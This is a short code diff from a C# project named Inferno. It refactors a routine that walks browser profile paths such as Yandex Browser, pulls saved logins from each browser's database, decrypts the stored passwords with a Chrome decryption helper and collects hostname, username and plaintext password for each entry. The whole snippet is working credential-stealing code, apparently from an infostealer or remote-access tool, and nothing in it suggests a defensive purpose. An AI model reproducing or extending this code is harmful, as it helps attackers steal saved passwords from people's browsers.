@@ -45,7 +45,7 @@ namespace Inferno
                 l_a + "Yandex\\YandexBrowser" + u_s
             };
 
-            List<string[]> passwords = new List<string[]>();
+            List<Dictionary<string, string>> passwords = new List<Dictionary<string, string>>();
             // Database
             string tempDatabaseLocation = "";
 
@@ -83,11 +83,11 @@ namespace Inferno
                     }
 
                     // Show credentials
-                    string[] credentials = new string[3]
+                    Dictionary<string, string> credentials = new Dictionary<string, string>
                     {
-                        hostname,
-                        Crypt.toUTF8(username),
-                        Crypt.toUTF8(Crypt.decryptChrome(password, browser))
+                        ["hostname"] = hostname,
+                        ["username"] = Crypt.toUTF8(username),
+                        ["password"] = Crypt.toUTF8(Crypt.decryptChrome(password, browser))
                     };
                     passwords.Add(credentials);
                     continue;
